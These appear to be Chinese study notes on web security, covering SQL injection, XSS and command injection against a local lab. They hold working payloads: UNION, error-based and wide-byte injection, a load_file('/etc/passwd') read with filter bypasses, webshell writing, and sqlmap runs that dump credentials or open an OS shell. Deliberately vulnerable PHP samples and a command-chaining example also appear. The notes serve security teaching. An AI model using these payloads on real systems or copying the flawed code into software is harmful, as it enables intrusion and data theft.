

# Web安全深度剖析

## 第五章 SQL注入漏洞

### 5.1 SQL注入原理

造成SQL注入漏洞的主要原因还是因为后端没有对用户的输入做任何或者说有效的过滤，导致拼接出了一条非预期的SQL语句并成功执行

### 5.2 注入漏洞分类

常见的SQL注入类型包括：数字型和字符型。也有人吧类型分的更多、更细。但不管注入类型如何，攻击者的目的只有一点，那就是绕过程序限制，使用户输入的数据带入数据库执行，利用数据库的特殊性获取更多的信息或者更大的权限

#### 5.2.1 数字型注入

数字型注入的最简单的一种型如下：`http://www.baidu.com?id=8`

要确定目标是否是数字型的注入，可以直接输入payload：`-1`拼接为`http://www.baidu.com?id=8-1`，此时如果页面发生了变化，则证明SQL端确实对`8-1`做了运算，以此便可确定是数字型注入

#### 5.2.2 字符型注入

当输入参数为字符串时，称为字符型；数字型和字符型最大的区别在于：数字型不需要单引号闭合，而字符串类型一般需要使用单引号来闭合

字符型例句：`select * from users where username='admin'`

最常见的注入方法是用`'`闭合前面的单引号并注释掉后面的单引号，中间则为可控部分，形如：`' or 1=1#`

### 5.3 常见的数据库注入

滴哦大数数据库而言，SQL注入的原理基本相似，因为每个数据库斗遵循一个SQL语法标准。但他们之间也存在许多细微的差异，包括语法、函数的不同。所以，在针对不同的数据库注入时，思路、方法也不可能完全一样

攻击者对数据库注入，无非是利用数据库获取更多的数据或者更大的权限，那么利用方式可以归为以下几大类：

+ 查询数据
+ 读写文件
+ 执行命令

#### 5.3.1 SQL Server

由于Docker Hub上没有找到现成环境且SQL Server就没遇到过，这里就偷懒了。需要的时候可以回去查......

#### 5.3.2 MySQL

##### 1. MySQL中的注释

MySQL支持以下3种注释风格

+ `#`：注释从`#`字符到行尾
+ `--`：注释从`--`序列到行尾。需要注意的是，使用此注释时，**后面需要跟上一个或多个空格**；注：空格、tag都可以
+ `/**/`：注释从`/*序列到后面*/`序列中间的字符

其中，`/**/`注释存在一个特点，观察以下SQL语句：

```sql
mysql> select username/*!50000,password*/ from users;
+----------+------------+
| username | password   |
+----------+------------+
| Dumb     | Dumb       |
| Angelina | I-kill-you |
| Dummy    | p@ssword   |
| secure   | crappy     |
| stupid   | stupidity  |
| superman | genious    |
| batman   | mob!le     |
| admin    | admin      |
+----------+------------+
```

这时因为`/*!*/`感叹号是有特殊意义的，比如`/*!50000,password*/`的意思是；若Mysql版本号高于或等于`5.0.00`，语句将会被执行

##### 2. 获取元数据

Mysql 5.0 及其以上版本提供了`information_schema.schema`，`information_schema.schema`是信息数据库，它提供了访问数据库元数据的方式

**1. 查询用户数据库名称**

```sql
mysql> select schema_name from information_schema.schemata;
+--------------------+
| schema_name        |
+--------------------+
| information_schema |
| challenges         |
| ctfsu              |
| ewshop             |
| ggbond             |
| intruder           |
| lmonkey            |
| mysql              |
| nodejs             |
| performance_schema |
| pyspider           |
| pyuser             |
| security           |
| sys                |
| tp_access          |
+--------------------+
15 rows in set (0.00 sec)
```

**2. 查询当前数据库表**

```sql
mysql> select table_name from information_schema.tables where table_schema=database();
+------------+
| table_name |
+------------+
| emails     |
| gg_flag    |
| gg_users   |
| referers   |
| uagents    |
| users      |
+------------+
6 rows in set (0.00 sec)
```

**3. 查询指定表的所有字段**

```sql
mysql> select column_name from information_schema.columns where table_schema=database() and table_name='users';
+-------------+
| column_name |
+-------------+
| id          |
| username    |
| password    |
+-------------+
3 rows in set (0.02 sec)
```

##### 3. UNION 查询

MySQL官方解释UNION查询用于把来自许多SELECT语句的结果组合到一个结果集合种，且每列的数据类型必须相同

```sql
SELECT * FROM users WHERE id=1 UNION SELECT 1,2,3;
```

##### 4. MySQL 函数利用

**（1）`load_file()`函数读文件操作**

MySQL提供了`load_file()`函数，可以帮助用户快速读取文件，但文件的位置必须在服务器上，文件必须为全路径名称**（绝对路径）**，而且用户必须持有FILE权限，文件容量也必须小于`max_allowed_packet`字节（默认为16MB，最大为1GB）

**MySQL的`secure_file_priv`必须为空，允许MySQL对文件进行读写操作**

```sql
# 查看是否允许读取文件
mysql> show variables like '%secure_file_priv%';
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
1 row in set (0.06 sec)

# 查看可读文件的最大
mysql> show variables like 'max_allowed_packet%';
+--------------------+----------+
| Variable_name      | Value    |
+--------------------+----------+
| max_allowed_packet | 16777216 |
+--------------------+----------+
1 row in set (0.01 sec)
```

SQL 语句如下：

```sql
mysql> select load_file('/etc/passwd');
```

通常。一些防注入语句不允许单引号的出现，那么使用以下语句绕过：

```sql
select load_file(0x2f6574632f706173737764);
```

或者使用：

```sql
select load_file(char(47, 101, 116, 99, 47, 112, 97, 115, 115, 119, 100));
```

`char()`的作用是将ASCII码转换为字符串

在浏览器返回数据时，有可能存在乱码问题，那么可以使用`hex()`函数将字符串转换为十六进制数据；经过测试发现MySQL在文件读取上默认返回的就是十六进制

```mysql
select hex(load_file(char(47, 101, 116, 99, 47, 112, 97, 115, 115, 119, 100)));
```

**（2）into outfile 写文件操作**

MySQL提供了向磁盘写入文件的操作，与`load_file()`一样，必须持有FILE权限`（secure_file_priv=''）`，并且文件必须为绝对路径

在写入时必须考虑MySQL是否有足够的权限往当前路径写文件

```mysql
select '<?php phpinfo();?>' into outfile '/tmp/1.php';
```

**（3）连结字符串**

在MySQL查询中，如果需要一次查询多个数据，可以使用`concat()`或`concat_ws()`函数来完成

1. `concat()`函数

   ```sql
   mysql> select concat(user(),',',version());
   +------------------------------+
   | concat(user(),',',version()) |
   +------------------------------+
   | root@localhost,8.0.33        |
   +------------------------------+
   1 row in set (0.00 sec)
   ```

   可以发现，现在三个值已经成为一列，并且以逗号隔开。在`concat()`函数中，逗号也可以使用十六进制数来表示

   ```sql
   mysql> select concat(user(),0x2c,version());
   +-------------------------------+
   | concat(user(),0x2c,version()) |
   +-------------------------------+
   | root@localhost,8.0.33         |
   +-------------------------------+
   1 row in set (0.00 sec)
   ```

2. `concat_ws()`函数

   ```
   concat_ws('分隔符', 参数1, 参数2)
   ```

   `concat_ws()`函数比`concat()`函数在使用上更简洁，且可以代替`concat()`函数

   ```sql
   mysql> select concat_ws(0x2c,user(),version());
   +----------------------------------+
   | concat_ws(0x2c,user(),version()) |
   +----------------------------------+
   | root@localhost,8.0.33            |
   +----------------------------------+
   1 row in set (0.00 sec)
   ```

<center><strong>常用MySQL函数及说明</strong></center>

| 函数                 | 说明                                           |
| -------------------- | ---------------------------------------------- |
| length               | 返回字符串长度                                 |
| substring            | 截取字符串长度                                 |
| ascii                | 返回ASCII码                                    |
| hex                  | 把字符串转换为十六进制                         |
| now                  | 当前系统时间                                   |
| unhex                | hex的方向操作                                  |
| floor(x)             | 返回不大于x的最大整数值                        |
| md5                  | 返回MD5值                                      |
| group_concat         | 返回带有来自一个组的连接的非NULL值的字符串结果 |
| @@datadir            | 读取数据库路径                                 |
| @@basedir            | MySQL安装路径                                  |
| @@version_complie_os | 操作系统                                       |
| user                 | 用户名                                         |
| current_user         | 当前用户名                                     |
| system_ueer          | 系统用户名                                     |
| database             | 数据库名                                       |
| version              | MySQL数据库版本                                |

<center><strong>MySQL 函数的权限</strong></center>

| 权限                    | 权限级别               | 权限说明                                                 |
| ----------------------- | ---------------------- | -------------------------------------------------------- |
| CREATE                  | 数据库、表或索引       | 创建数据库、表或索引权限                                 |
| DROP                    | 数据库或表             | 删除数据库或表权限                                       |
| GRANT OPTION            | 数据库、表或保存的程序 | 赋予权限选项                                             |
| ALTER                   | 表                     | 更改表，比如添加字段                                     |
| DELETE                  | 表                     | 删除数据权限                                             |
| INDEX                   | 表                     | 索引权限                                                 |
| INSERT                  | 表                     | 插入数据权限                                             |
| SELETE                  | 表                     | 查询权限                                                 |
| UPDATE                  | 表                     | 更新权限                                                 |
| CREATE VIEW             | 视图                   | 创建视图权限                                             |
| SHOW VIEW               | 视图                   | 查看视图权限                                             |
| ALTER ROUTING           | 存储过程               | 更改存储过程权限                                         |
| CREATE ROUTING          | 存储过程               | 创建存储过程权限                                         |
| EXECUTE                 | 存储过程               | 执行存储过程权限                                         |
| FILE                    | 服务器主机上的文件权限 | 文件访问权限                                             |
| CREATE TEMPORARY TABLES | 服务器管理             | 创建临时表权限                                           |
| LOCK TABLES             | 服务器管理             | 锁表权限                                                 |
| CREATE USER             | 服务器管理             | 创建用户权限                                             |
| PROCESS                 | 服务器管理             | 查看进程权限                                             |
| PELOAD                  | 服务器管理             | 执行 flush-hosts、flush-logs、flush-privileges等命令权限 |
| PEPLICATION CLIENT      | 服务器管理             | 复制权限                                                 |
| PREPLICATION SLAVE      | 服务器管理             | 复制权限                                                 |
| SHOW DATABASES          | 服务器管理             | 查看数据库权限                                           |
| SHUTDOWN                | 服务器管理             | 关闭数据库权限                                           |
| SUPER                   | 服务器管理             | 执行kill线程权限                                         |

##### 5. MySQL 显错式注入

这里直接给出`insert`和`update`语句的用法

```sql
mysql> update users set password='admin' where username='sugar' or updatexml(1,concat(0x7e, (select version())),3);
ERROR 1105 (HY000): XPATH syntax error: '~5.7.26'

mysql> insert into users (username,password) values ('jack', 'jack' and extractvalue(0x7e, concat(0x7e, (select database()))));
ERROR 1105 (HY000): XPATH syntax error: '~security'
```

##### 6. 宽字节注入

==首先要保证目标的数据库使用的是GBK编码==

将payload改为：`1%df' and 1=1#`，

```php
<?php
$id = "1%df' and 1=1#";
$id = addslashes($id);
$sql = "select * from users where id = '{$id}'";
var_dump($sql);

# 输出：
string(48) "select * from users where id = '1%df\' and 1=1#'"
```

此时，由于GBK的编码方式，会将`%df\`组成一个新字符，这个字符是一个汉字，导致`\`失效，`'`恢复功能：`1ߜ' and 1=1#`

##### 7. MySQL 长字符截断

在MySQL中的一个设置里有一个`sql_mode`选项，当`sql_mode`设置为`default`时，即没有开启`STRICT_ALL_TABLES`选项时（Mysql `sql_mode`默认即`default`），MySQL对插入超长的值只会提示warning，而不是error，这样就可能会导致一些截断问题

新建一张测试表，表结构如下（5.7.26）

```sql
create table test(
id int(11) NOT NULL,
username varchar(7) NOT NULL,
password varchar(12) NOT NULL
);
```

分别插入以下数据

1. 插入正常SQL语句

   ```sql
   insert into test (id,username,password) values (1,'admin','admin');
   ```

2. 插入错误的SQL语句，此时的admin   右面有三个空格，长度为8，已经超过了原有的规定长度

   ```sql
   insert into test (id,username,password) values (2,'admin   ','admin');
   ```

   虽然发生了警告，但是第二条数据依然被成功插入到数据表中

   ```sql
   mysql> select * from test;
   +----+----------+----------+
   | id | username | password |
   +----+----------+----------+
   |  1 | admin    | admin    |
   |  2 | admin    | admin    |
   +----+----------+----------+
   2 rows in set (0.00 sec)
   ```

   使用`length()`函数来获取长度的变化

   ```sql
   mysql> select length(username) from test where id=1;
   +------------------+
   | length(username) |
   +------------------+
   |                5 |
   +------------------+
   1 row in set (0.01 sec)
   
   # 由于字段长度为7，所以哪怕输入长度为8也会被截取为长度7
   mysql> select length(username) from test where id=2;
   +------------------+
   | length(username) |
   +------------------+
   |                7 |
   +------------------+
   1 row in set (0.00 sec)
   ```

   可以发现，第二条与第三条数据的长度为7，也就是列的规定长度，由此可知，在默认情况下。如果数据超出列默认长度，MySQL会将其截断。

   但这样何来攻击一说呢？下面查询用户名为`admin`的用户就知道了

   ```sql
   mysql> select * from test where username='admin';
   +----+----------+----------+
   | id | username | password |
   +----+----------+----------+
   |  1 | admin    | admin    |
   |  2 | admin    | admin    |
   +----+----------+----------+
   2 rows in set (0.00 sec)
   ```

   只查询用户名为`admin`用户，但是另外两个长度不一致的admin用户也被查询出，这样就会导致一些安全问题，必须，有一处管理员登录的SQL如下

   ```php
   SELECT count(*) FROM users where username='admin' and password='$_POST["password"]'
   ```

   假设这条SQL语句没有任何注入漏洞，攻击者也可能登录到管理页面。

   假设管理员登录的用户名为`admin`，那么攻击者仅需要注册一个“admin   ”用户即可轻易进入后台管理页面！！！

##### 8. 延时注入

如果目标站点没有任何的回显，此时可以尝试延时注入

思路：

1. 尝试拼接SQL语句并使用`sleep(3)`函数来判断目标站点是否发生延迟
2. 获取目标数据并截取出字符串的第一个字符，并转换为ASCII码
3. 将第一个字符的ASCII与ASCII码表对比，如果对比成功将延时3秒
4. 继续步骤2、3，之子字符串截取完毕

具体步骤翻阅葵花宝典

### 5.4 SQL 注入工具

#### 5.4.1 SQLMap

SQLMap特点如下：

+ 数据库支持MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM、DB2、SQLite、Firebird、Sybase和SAP MaxDB
+ SQL注入类型包括SQL盲注、UNION注入、报错注入、时间盲注、布尔盲注和堆叠注入等技术
+ 支持枚举用户、密码哈希、权限、角色、数据库、表和列
+ 支持任意命令
+ 自动识别密码加密方式，并且可以使用字典解密
+ 支持数据导出功能

##### 1. 使用SQLMap

###### 第一步：判断是否有注入点

使用-u参数指定URL，如果URL存在注入点，将会显示出Web容器、数据库版本信息

```bash
┌──(root㉿kali)-[/home/kali]
└─# sqlmap -u "http://192.168.231.1/test2.php?id=1" 
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 1035=1035

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 OR (SELECT 3063 FROM(SELECT COUNT(*),CONCAT(0x717a767171,(SELECT (ELT(3063=3063,1))),0x717a717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 3709 FROM (SELECT(SLEEP(5)))CbSF)

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: id=-5045 UNION ALL SELECT CONCAT(0x717a767171,0x627148795652506e496a6b58564c53496679515a68456958646851494b746147465248426c476958,0x717a717171)-- -
---
```

###### 第二步：获取数据库

```bash
┌──(root㉿kali)-[/home/kali]
└─# sqlmap -u "http://192.168.231.1/test2.php?id=1" --dbs
available databases [15]:
[*] challenges
[*] ctfsu
[*] ewshop
[*] ggbond
[*] information_schema
[*] intruder
[*] lmonkey
[*] mysql
[*] nodejs
[*] performance_schema
[*] pyspider
[*] pyuser
[*] security
[*] sys
[*] tp_access
```

###### 第三步：查看当前应用程序所用数据库

```bash
┌──(root㉿kali)-[/home/kali]
└─# sqlmap -u "http://192.168.231.1/test2.php?id=1" --current-db
[09:17:43] [INFO] fetching current database
current database: 'security'
```

###### 第四步：列出指定数据库的所有表

使用`--table`参数获取数据库表，-D参数指定数据库

```bash
┌──(root㉿kali)-[/home/kali]
└─# sqlmap -u "http://192.168.231.1/test2.php?id=1" --tables -D 'security'
[09:18:39] [INFO] fetching tables for database: 'security'
Database: security
[7 tables]
+----------+
| emails   |
| gg_flag  |
| gg_users |
| referers |
| test     |
| uagents  |
| users    |
+----------+
```

###### 第五步：读取指定表中的字段名称

使用`--columns`参数列出字段名

```bash
┌──(root㉿kali)-[/home/kali]
└─# sqlmap -u "http://192.168.231.1/test2.php?id=1" --columns -D 'security' -T 'users'
[09:19:59] [INFO] fetching columns for table 'users' in database 'security'
Database: security
Table: users
[3 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int(3)      |
| password | varchar(20) |
| username | varchar(20) |
+----------+-------------+
```

###### 第六步：读取指定字段内容

`--dump`参数转存数据、`-C`参数指定字段名称

```bash
┌──(root㉿kali)-[/home/kali]
└─# sqlmap -u "http://192.168.231.1/test2.php?id=1" -C 'username,password' -D 'security' -T 'users' --dump
[09:21:23] [INFO] fetching entries of column(s) 'password,username' for table 'users' in database 'security'
Database: security
Table: users
[19 entries]
+----------+------------+
| username | password   |
+----------+------------+
| Dumb     | Dumb       |
| Angelina | I-kill-you |
| Dummy    | p@ssword   |
| secure   | crappy     |
| stupid   | stupidity  |
| superman | genious    |
| batman   | mob!le     |
| admin    | admin      |
| admin1   | admin1     |
| admin2   | admin2     |
| admin3   | admin3     |
| dhakkan  | dumbo      |
| admin4   | admin4     |
| Spider   | Aa123456   |
| Spider   | Aa123456   |
| Spider   | Aa123456   |
| Spider   | Aa123456   |
| jack     | jack       |
| sugar    | admin      |
+----------+------------+
```

##### 2. SQLMap参数

###### （1）测试注入点权限

```bash
┌──(root㉿kali)-[/home/kali]
└─# sqlmap -u "http://192.168.231.1/test2.php?id=1" --privileges 
[09:24:55] [INFO] fetching database users privileges
database management system users privileges:
[*] 'mysql.session'@'localhost' (administrator) [1]:
    privilege: SUPER
[*] 'mysql.sys'@'localhost' [1]:
    privilege: USAGE
[*] 'root'@'localhost' (administrator) [28]:
    privilege: ALTER
    privilege: ALTER ROUTINE
    privilege: CREATE
    privilege: CREATE ROUTINE
    privilege: CREATE TABLESPACE
    privilege: CREATE TEMPORARY TABLES
    privilege: CREATE USER
    privilege: CREATE VIEW
    privilege: DELETE
    privilege: DROP
    privilege: EVENT
    privilege: EXECUTE
    privilege: FILE
    privilege: INDEX
    privilege: INSERT
    privilege: LOCK TABLES
    privilege: PROCESS
    privilege: REFERENCES
    privilege: RELOAD
    privilege: REPLICATION CLIENT
    privilege: REPLICATION SLAVE
    privilege: SELECT
    privilege: SHOW DATABASES
    privilege: SHOW VIEW
    privilege: SHUTDOWN
    privilege: SUPER
    privilege: TRIGGER
    privilege: UPDATE


┌──(root㉿kali)-[/home/kali]
└─# sqlmap -u "http://192.168.231.1/test2.php?id=1" --privileges -U sa			// 测试sa用户权限
```

###### （2）执行shell命令

```bash
# 执行 net user 命令
┌──(root㉿kali)-[/home/kali]
└─# sqlmap -u "http://192.168.231.1/test2.php?id=1" --os-cmd="net user"

# 系统交互的shell
┌──(root㉿kali)-[/home/kali]
└─# sqlmap -u "http://192.168.231.1/test2.php?id=1" --os-shell
```

###### （3）获取当前数据库名称

```bash
┌──(root㉿kali)-[/home/kali]
└─# sqlmap -u "http://192.168.231.1/test2.php?id=1" --current-db
```

###### （4）执行SQL命令

返回SQL交互的shell，可以执行SQL语句

```bash
┌──(root㉿kali)-[/home/kali]
└─# sqlmap -u "http://192.168.231.1/test2.php?id=1" --sql-shell

┌──(root㉿kali)-[/home/kali]
└─# sqlmap -u "http://192.168.231.1/test2.php?id=1" --sql-query='sql'
```

###### （5）POST提交方式

```bash
┌──(root㉿kali)-[/home/kali]
└─# sqlmap -u "http://192.168.231.1/test2.php?id=1" --data "POST 参数"
```

###### （6）显示详细的等级

```bash
┌──(root㉿kali)-[/home/kali]
└─# sqlmap -u "http://192.168.231.1/test2.php?id=1" --dbs -v 1
```

`-v`参数包含以下7个等级

+ 0：只显示Python的回朔、错误和关键信息
+ 1：显示信息和警告信息
+ 2：显示调试信息
+ 3：有效载荷注入
+ 4：显示HTTP请求
+ 5：显示HTTP响应头
+ 6：显示HTTP响应页面内容

###### （7）注入HTTP请求

```bash
┌──(root㉿kali)-[/home/kali]
└─# sqlmap -r head.txt --dbs

# head.txt 内容如下
POST /lolgin.php HTTP/1.1
HOST: www.secbug.com
User-Agent: Mozilla/5,0

username=admin&password=admin
```

<center><strong>常用 SQLMap参数及说明</strong></center>

| 参数               | 说明                                             |
| ------------------ | ------------------------------------------------ |
| -b                 | 获取banner                                       |
| -p                 | 指定测试参数                                     |
| -g                 | 从Goole中获取URL，-g "inurl:aspx?id="            |
| --pgage=GOOGLEPAGE | 指定Google页码                                   |
| --union-check      | 是否支持union注入                                |
| --union-cols       | union 查询表记录                                 |
| --union-test       | union 语句测试                                   |
| --union-use        | 采用 union 注入                                  |
| --proxy            | 代理注入                                         |
| --threads          | 采用多线程                                       |
| --user-agent       | 自定义 user-agent                                |
| --refer=REFERER    | HTTP referer 头                                  |
| --string           | 指定关键词                                       |
| --tor              | 创建tor的匿名网络                                |
| --predict-output   | 常见的查询输出预测                               |
| --keep-alive       | 使用持久 HTTP (S) 连接                           |
| --eval=EVALCODE    | 使用 HTTP 参数污染                               |
| -a, all            | 查询所有                                         |
| --hostname         | 主机名                                           |
| --is-dba           | 是否时管理员权限                                 |
| --users            | 枚举所有用户                                     |
| --passwords        | 枚举所有的用户密码                               |
| --roles            | 枚举所有的用户角色                               |
| --schema           | 枚举DBMS模式                                     |
| --count            | 枚举所有的条目数                                 |
| --dump             | 转存DBMS数据库表项目，需要指定字段名称（列名称） |
| --dump-all         | 所属列、表或数据库名称                           |
| --search           | 搜索列、表或数据库名称                           |
| --exclude-sysdbs   | 在枚举表时排除系统数据库                         |
| --sql-query=query  | 执行SQL语句                                      |
| --file-read=RFILE  | 读取操作                                         |
| --file-write=WFILE | 写入操作                                         |
| --file-dest=DFILE  | 绝对路径写入                                     |
| --reg-read         | 读取一个Windows注册表项值                        |
| --reg-add          | 增加一个Windows注册表项值数据                    |
| --reg-del          | 删除一个Windows注册表项值数据                    |
| --reg-key=REGKEY   | Windows 注册表键                                 |
| --reg-value=REGKEY | Windows 注册表键值                               |
| --reg-data=REGDATA | Windows 注册表的键值项数据                       |
| --reg-type=REGDATA | Windows 注册表键的值类型                         |
| --dump-format=DUMP | 转存数据格式（CSV（default）、HTML 或 SQLITE）   |
| --hex              | 使用十六进制检索数据                             |
| --output-dir=ODIR  | 自定义输出的目录路径                             |
| --update           | 更新 SQLMap                                      |
| --purge-output     | 安全删除所有内容的输出目录                       |
| --check-waf        | 启发式检查 WAF/IPS/IDS 保护                      |
| --os-pwn           | 反弹SHELL                                        |
| --cookie=COOKIE    | 指定HTTP Cookie，预登录                          |
| --random=TAMPER    | 使用SQLMap插件                                   |
| --tamper=TAMPER    | 使用SQLMap插件                                   |
| --level            | 测试等级（1~5），默认为1                         |

## 第七章 XSS跨站脚本漏洞

### 7.1 XSS 原理解析

XSS攻击是在网页中嵌入客户端恶意脚本代码，这些恶意代码一般是使用JavaScript语言编写的。Javascript可以用来获取用户的Cookie、改变网页内容、URL调转，那么存在XSS漏洞的网站，就可以盗取用户Cookie、黑掉页面、导航到恶意网站，而攻击者需要做的仅仅是向Web页面注入Javascript代码

下面是最简单的XSS漏洞实例：

```php
<?php
echo "<h1>{$_GET['id']}</h1>";
```

当输入`id=<script>alert(1)</script>`时，触发XSS攻击

![image-20240414191731134](%E4%B9%A6%E7%B1%8D%E7%AC%94%E8%AE%B0.assets/image-20240414191731134.png)

### 7.2 XSS 类型

XSS 主要被分为三类，分别是：反射性、存储型和DOM型

#### 7.2.1 反射性XSS

反射性XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。当用户访问一个带有XSS代码的UEL请求时，服务器端接收数据后处理，然后把带有XSS代码的数据发送待浏览器，浏览器解析这段带有XSS代码的数据后，最后造成XSS漏洞。

下面是最简单的反射型XSS漏洞实例：

```php
<?php
echo "<h1>{$_GET['id']}</h1>";
```

#### 7.2.2 存储型XSS

允许用户存储数据的Web应用程序都可能会出现存储型XSS漏洞，当攻击者提交一段XSS代码后，**被服务器接收并存储**，当攻击者再次访问某个页面时，这段XSS代码程序读出来响应给浏览器，造成XSS跨站攻击，这就是存储型XSS

存储型XSS与反射性XSS、DOM型XSS相比，具有更高的隐蔽性，危害性也更大。它们之间最大的区别在于反射性XSS与DOM性XSS执行都必须依靠用户手动去触发，而存储型XSS却不需要

以下是简单的存储型XSS实例：

```php
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
</head>
<body>
<form action="#" method="post">
    输入您的评论：<input type="text" name="comment">
    <input type="submit" value="提交">
</form>
<br>
<h2>下面是所有评论</h2>
<?php
// 查询数据操作
$mysql = new mysqli('127.0.0.1', 'root', 'root', 'security');
$mysql->query('set names utf8');

$res = $mysql->query('select * from comment');
if ($res) {
    while ($row = $res->fetch_assoc()) {
        // 在这里处理每一行的数据
        echo $row['text'] . "\n";
    }
}
?>
</body>
</html>


<?php
// 插入数据操作
$mysql = new mysqli('127.0.0.1', 'root', 'root', 'security');
$mysql->query('set names utf8');

$comment = $_POST['comment'];
if ($comment) {
    $mysql->query("INSERT INTO comment (text)VALUES ('{$comment}')");
}
```

可以看到用户在前端注入恶意js代码后，后端会将这条代码**存储到数据库中**，以后每个用户访问该页面，后端都会将这条数据返回并渲染

#### 7.2.3 DOM型XSS

DOM本身就代表文档的意思，而基于DOM型的XSS是不需要与服务器交互的，它只发生在客户端处理数据阶段

```js
<!--payload: content=<script>alert(123)</script>-->
<script>
    const temp = document.URL                               // 返回当前URL
    const index = document.URL.indexOf("content=") + 4      // 获取 content= 的索引并加4
    const par = temp.substring(index)                       // 根据索引获取payload
    document.write(decodeURI(par))                          // 将 payload 写入当前HTML
</script>
```

### 7.3 检测XSS

检测XSS一般分为两种方式，一种是手工检测，另一种是软件自动检测，各有利弊

#### 7.3.1 手工检测XSS

使用手工检测XSS时，一定要选择有特殊一样的字符，这样可以快速检测是否存在XSS，比如，测试某输入框是否存在XSS漏洞时，不要直接输入XSS跨站语句测试，应一步一步地进行，这样更有利于测试

##### 1. 可得知输出位置

输入一些敏感字符，例如`< > " ' ()`等，在提交请求后查看HTML源代码，看这些输入的字符是否被转义

推荐输入`AAAA<>`的形式做测试，不然服务器如果做了转义会很难找

##### 2. 无法得出输出位置

很多Web应用程序源码是不对外开放的，这时在测试XSS时就有可能无法得知输入数据到底在何处显示，例如：

+ 在`<div>`标签中：`<div>XSS Test</div>`
+ 在`<input>`标签中：`<input type="text" name="content" value="XSS Test"/>`

对于这种情况，通常会采用`/>XSS Test`来测试

#### 7.3.2 全自动检测XSS

专业的XSS扫描工具有很多，像有名的XSSER、XSSF都是不错的选择！

### 7.4 XSS 高级利用

XSS的常见危害：

+ 盗取用户Cookie
+ 修改网页内容
+ 网站挂马
+ 利用网站重定向
+ XSS蠕虫

#### 7.4.1 XSS会话劫持

##### 1. Cookie 简介

Cookie主要用于记录用户ID、密码、停留时间等信息，可分为非持久Cookie（内存Cookie）和持久Cookie（文件Cookie）

程序是人开发的，关于Cookie的功能、Cookie的存在形式，也是人定义的，目的其实是为了更好的处理程序业务，不要将Cookie的概念固定死在八股文中！！！

##### 2. Cookie 格式

Cookie 由变量名（Key）和值（Value）组成，其属性里既有标准的Cookie变量，也有用户自己创建的变量，属性中的变量用”变脸=值“的形式来保存

Cookie 格式如下：

```
Set=Cookie: <name>=<value>[; <Max-age>=<age>][; expires=<date>][; domain=<domain_name>][; path=<some_path>][; secure][; HttpOnly]
```

其中，各选项的含义如下：

+ `Set=Cookie`：HTTP响应头，Web服务器通过此HTTP头向客户端发送Cookie
+ `name=value`：这是每一个Cookie均必须有的部分。用户可以通过name取得Cookie中存放的值（Value）。在字符串`name=value`中，不含符号、逗号和空格等字符
+ `expires=date`：Expires确定了Cookie的有效终止日期，该属性值date必须以特定的格式来书写”星期几“，`DD-MM-YY HH:MM:SS GMT`，其中，GMT表示这是格林尼治时间。反之，若不以这样的格式来书写，系统将无法识别。该变量可省，如果缺省，则Cookie的属性值不会保存在用户的硬盘中，而仅仅保存在内存中，Cookie将随浏览器的关闭而自动小时
+ `domain=domain-name`：Domain变量确定了哪些Internet域中的Web服务器可读取浏览器存储的Cookie，即只有来自这个域的页面才可以使用Cookie中的信息。这项设置时可选的，如果缺省，值为该Web服务器的域名
+ `path=path`：Path 属性定义了Web服务器上哪些路径下的页面可获取服务器发送的Cookie。如果Path属性的值为`/`，则Web服务器上所有的WWW资源均可读取该Cookie，同样，该选项设置是可选的，如果确实，则Path的属性值为Web服务器传给浏览器的资源路径名。借助对domain和path两个变量的设置，即可有效地控制Cookie文件被访问的范围
+ `Secure`：在Cookie中标记该变量，表明只有当浏览器和Web Server之间的通信协议为加密认证协议时，浏览器才向服务器体提交响应的Cookie。当前这种协议只有一种，即为HTTPS
+ HttpOnly：禁止JavaScript读取

Cookie 中的内容大多数经过了加密处理，因此，一般用户看来知识一些毫无意义的字母数字组合，只有服务器的处理程序才直到它们真正的含义

## 第八章 命令执行

### 8.1 OS 命令执行漏洞示例

通常出现于开发者在调用直接调用外部系统命令的时候，对用户输入没有做有效过滤导致用户可以拼接出恶意的命令

在Windows的CMD命令输入框中输入`ping 127.0.0.1 && net user`，最终显示的结果为：

```shell
C:\Users\19374>ping 127.0.0.1 && net user

Pinging 127.0.0.1 with 32 bytes of data:
Reply from 127.0.0.1: bytes=32 time<1ms TTL=128
Reply from 127.0.0.1: bytes=32 time<1ms TTL=128
Reply from 127.0.0.1: bytes=32 time<1ms TTL=128
Reply from 127.0.0.1: bytes=32 time<1ms TTL=128

Ping statistics for 127.0.0.1:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms

User accounts for \\WEIJAY_HOST

-------------------------------------------------------------------------------
Administrator            DefaultAccount
Guest                    WDAGUtilityAccount
The command completed successfully.
```

在Windows系统下，`&&`的作用是将两条命令连接起来执行，在Linux系统下同样适用

### 8.2 命令执行模型

很多人喜欢把代码执行漏洞称为命令执行漏洞，因为命令执行漏洞可以执行系统命令，而代码执行漏洞也会执行系统命令，这样就容易混淆。其实两者比较好区分，它们之间的区别比较大，命令执行漏洞是直接调用操作系统命令，故这里叫做OS命令执行漏洞，而代码执行漏洞则是靠执行脚本代码调用操作系统命令

```php
eval(system('set'););
```

#### 8.2.1 PHP 命令执行

PHP 提供了部分函数用来执行外部应用程序，例如：`system() shell_exec() exec() passthru()`

##### 示例一：命令执行

```php
<?php
$host = $argv[1];
system("ping " . $host);     // 执行 ping 命令
```

执行结果：

![image-20240415142443463](%E4%B9%A6%E7%B1%8D%E7%AC%94%E8%AE%B0.assets/image-20240415142443463.png)

注：使用PHP.EXE传递参数时，如果有空格，一般在Windows下使用双引号，Linux下使用单引号括起来，否则将无法执行

